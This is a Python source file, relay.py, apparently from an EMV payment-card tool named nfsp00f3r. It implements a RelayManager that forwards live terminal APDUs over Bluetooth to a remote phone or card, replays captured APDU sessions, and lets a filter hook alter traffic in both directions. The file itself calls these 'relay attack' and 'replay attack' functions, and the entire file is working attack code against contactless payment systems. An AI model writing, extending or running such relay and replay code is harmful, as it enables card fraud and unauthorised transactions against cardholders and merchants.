# =====================================================================
# File: relay.py
# Project: nfsp00f3r V4.04 - EMV Terminal & Card Manager with Companion
# Author: Gregory King
# Date: 2025-08-01
#
# Description:
#   Robust relay and replay attack logic with live stats, filtering, 
#   session save/load, and error handling.
#   - Relay: Forwards all APDUs between terminal and remote card/phone.
#   - Replay: Sends captured APDU sessions for replay/analysis.
#   - Thread-safe, low-latency, UI-updated.
#
# Functions:
#   - RelayManager(card_manager, bluetooth_companion)
#       - start_relay(apdu_source_callback, apdu_filter=None)
#       - stop_relay()
#       - relay_thread_run(apdu_source_callback, apdu_filter)
#       - perform_replay(token_list, apdu_filter=None)
#       - save_session_log(filename)
#       - load_session_log(filename)
#       - relay_status (pyqtSignal)
# =====================================================================

from PyQt5.QtCore import QObject, pyqtSignal
import threading
import time
import json

class RelayManager(QObject):
    relay_status = pyqtSignal(str)
    relay_stats  = pyqtSignal(dict)  # For UI: live stats

    def __init__(self, card_manager, bluetooth_companion):
        super().__init__()
        self.card_manager = card_manager
        self.bluetooth_companion = bluetooth_companion
        self._relaying = False
        self._relay_thread = None
        self.stats = self._make_stats()
        self.session_log = []  # List of {apdu, response, ts, error}

    def _make_stats(self):
        return {
            "start_time": None,
            "stop_time": None,
            "apdus_relayed": 0,
            "last_apdu": "",
            "error": "",
            "active": False,
        }

    def start_relay(self, apdu_source_callback, apdu_filter=None):
        """
        Start relaying all APDUs from a live source to phone/card, responses back.
        apdu_source_callback: blocking callable returns (apdu_bytes, send_response_callback) or None.
        apdu_filter: optional function(apdu_bytes, direction) -> apdu_bytes (direction: 'to_card' or 'to_terminal')
        """
        if self._relaying:
            self.relay_status.emit("Relay already running.")
            return
        self._relaying = True
        self.stats = self._make_stats()
        self.stats["start_time"] = time.time()
        self.stats["active"] = True
        self.session_log = []
        self._relay_thread = threading.Thread(
            target=self.relay_thread_run,
            args=(apdu_source_callback, apdu_filter),
            daemon=True
        )
        self._relay_thread.start()
        self.relay_status.emit("Relay attack started. Waiting for terminal APDUs...")
        self.relay_stats.emit(self.stats.copy())

    def stop_relay(self):
        self._relaying = False
        if self._relay_thread and self._relay_thread.is_alive():
            self._relay_thread.join(timeout=2)
        self._relay_thread = None
        self.stats["stop_time"] = time.time()
        self.stats["active"] = False
        self.relay_status.emit("Relay attack stopped.")
        self.relay_stats.emit(self.stats.copy())

    def relay_thread_run(self, apdu_source_callback, apdu_filter):
        """
        Continuously relay APDUs as received from the terminal to the phone/card.
        """
        while self._relaying:
            try:
                result = apdu_source_callback()
                if not result:
                    time.sleep(0.01)
                    continue
                apdu, send_response_callback = result
                orig_apdu = apdu

                # Allow optional APDU filtering/hooking
                if apdu_filter:
                    apdu = apdu_filter(apdu, "to_card")

                self.relay_status.emit(f"Relaying APDU: {apdu.hex().upper()}")
                self.stats["last_apdu"] = apdu.hex().upper()
                self.stats["apdus_relayed"] += 1

                try:
                    response = self.bluetooth_companion.send_apdu_to_phone(apdu)
                    # Allow filter to hook/modify response before sending back
                    if apdu_filter:
                        response = apdu_filter(response, "to_terminal")
                    self.relay_status.emit(f"Received response: {response.hex().upper()}")
                    send_response_callback(response)
                    err = ""
                except Exception as e:
                    response = b''
                    err = f"Relay error: {e}"
                    self.relay_status.emit(err)
                    self.stats["error"] = err
                    self.stop_relay()  # Auto-stop on failure
                    break

                # Session log (all relay events)
                self.session_log.append({
                    "ts": time.time(),
                    "apdu": orig_apdu.hex(),
                    "relayed_apdu": apdu.hex(),
                    "response": response.hex(),
                    "error": err
                })

                self.relay_stats.emit(self.stats.copy())

            except Exception as e:
                self.stats["error"] = f"Relay error: {e}"
                self.relay_status.emit(self.stats["error"])
                self.stop_relay()
                break

    def perform_replay(self, token_list, apdu_filter=None):
        """
        Replay a list of APDUs via the phone/card, log every result.
        token_list: list of apdu_bytes
        apdu_filter: optional filter/hook
        Returns: list of response bytes (same order as input).
        """
        self.relay_status.emit("Starting replay attack...")
        responses = []
        self.session_log = []
        self.stats = self._make_stats()
        self.stats["start_time"] = time.time()
        self.stats["active"] = True

        for i, apdu in enumerate(token_list):
            try:
                send_apdu = apdu_filter(apdu, "to_card") if apdu_filter else apdu
                self.relay_status.emit(f"Replaying APDU [{i+1}/{len(token_list)}]: {send_apdu.hex().upper()}")
                response = self.bluetooth_companion.send_apdu_to_phone(send_apdu)
                response = apdu_filter(response, "to_terminal") if apdu_filter else response
                self.relay_status.emit(f"Replay response [{i+1}]: {response.hex().upper()}")
                responses.append(response)
                self.session_log.append({
                    "ts": time.time(),
                    "apdu": apdu.hex(),
                    "relayed_apdu": send_apdu.hex(),
                    "response": response.hex(),
                    "error": ""
                })
                self.stats["apdus_relayed"] += 1
                self.stats["last_apdu"] = apdu.hex().upper()
                self.relay_stats.emit(self.stats.copy())
            except Exception as e:
                err = f"Replay error [{i+1}]: {e}"
                self.relay_status.emit(err)
                self.session_log.append({
                    "ts": time.time(),
                    "apdu": apdu.hex(),
                    "relayed_apdu": "",
                    "response": "",
                    "error": err
                })
                responses.append(b'')
                self.stats["error"] = err
                self.relay_stats.emit(self.stats.copy())
        self.stats["stop_time"] = time.time()
        self.stats["active"] = False
        self.relay_status.emit("Replay attack complete.")
        self.relay_stats.emit(self.stats.copy())
        return responses

    def save_session_log(self, filename):
        """
        Save the full relay/replay session log to a JSON file.
        """
        try:
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(self.session_log, f, indent=2)
            self.relay_status.emit(f"Session log saved to {filename}")
        except Exception as e:
            self.relay_status.emit(f"Error saving session log: {e}")

    def load_session_log(self, filename):
        """
        Load a session log (list of APDU/response dicts) for replay or review.
        """
        try:
            with open(filename, "r", encoding="utf-8") as f:
                self.session_log = json.load(f)
            self.relay_status.emit(f"Session log loaded from {filename}")
            return self.session_log
        except Exception as e:
            self.relay_status.emit(f"Error loading session log: {e}")
            return []

    def relay_single_apdu(self, apdu, apdu_filter=None):
        """
        Relay a single APDU (manual/UI).
        """
        self.relay_status.emit(f"Relaying single APDU: {apdu.hex().upper()}")
        try:
            send_apdu = apdu_filter(apdu, "to_card") if apdu_filter else apdu
            response = self.bluetooth_companion.send_apdu_to_phone(send_apdu)
            response = apdu_filter(response, "to_terminal") if apdu_filter else response
            self.relay_status.emit(f"Single APDU response: {response.hex().upper()}")
            self.session_log.append({
                "ts": time.time(),
                "apdu": apdu.hex(),
                "relayed_apdu": send_apdu.hex(),
                "response": response.hex(),
                "error": ""
            })
            return response
        except Exception as e:
            err = f"Single APDU relay error: {e}"
            self.relay_status.emit(err)
            self.session_log.append({
                "ts": time.time(),
                "apdu": apdu.hex(),
                "relayed_apdu": "",
                "response": "",
                "error": err
            })
            return b''

